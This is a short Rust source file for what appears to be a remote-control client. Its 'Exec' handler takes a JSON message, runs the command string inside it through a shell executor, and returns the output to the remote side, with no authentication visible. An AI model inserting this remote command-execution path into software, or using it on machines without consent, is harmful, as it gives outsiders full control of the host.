use crate::client_handlers::def_handler::SubHandle;
use async_std::sync::Arc;
use std::sync::Mutex;
use crate::utils::rcmd::*;
use crate::ext_code::*;
use crate::model;
use crate::tools;
pub struct Exec
{
    rcmd:Arc<Mutex<Rcmd>>
}

impl Exec {
    pub fn new()->Exec
    {
        Exec{
            rcmd:Arc::new(Mutex::new(Rcmd::new()))
        }
    }
}

impl SubHandle for Exec
{
    fn handle(&self, data: &[u8], len: u32, ext: u32) -> Option<(Vec<u8>, u32)> {
        if ext == EXT_EXEC_CMD {
            let cmd = String::from_utf8_lossy(data).to_string();
            let msg = serde_json::from_str::<model::SendMsg>(&cmd);
            if msg.is_err(){
                let mut res = vec![];
                res.resize(std::mem::size_of::<u32>(),0);
                tools::set_slices_form_u32(&mut res[..],EXT_ERR_PARSE_ARGS);
                return Some((res,EXT_ERR_EXEC_CMD_RET_ERR));
            }
            let mut msg = msg.unwrap();
            if let Ok(mut r) = self.rcmd.lock()
            {
                let res = match r.exec_ex(msg.msg.trim().to_string())
                {
                    Ok(v) => {
                        v
                    }
                    Err(e) => {
                       CmdRes::err_str(e)
                    }
                };
                //dbg!(&res);
                if let Ok(r) = serde_json::to_string(&res){
                    //dbg!(&r);
                    msg.msg = r;
                    return Some((serde_json::to_string(&msg).unwrap().into_bytes(),EXT_EXEC_CMD));
                }else{
                    return Some((vec![],EXT_ERR_EXEC_CMD_NOT_KNOW));
                };
            }
        }
        None
    }
}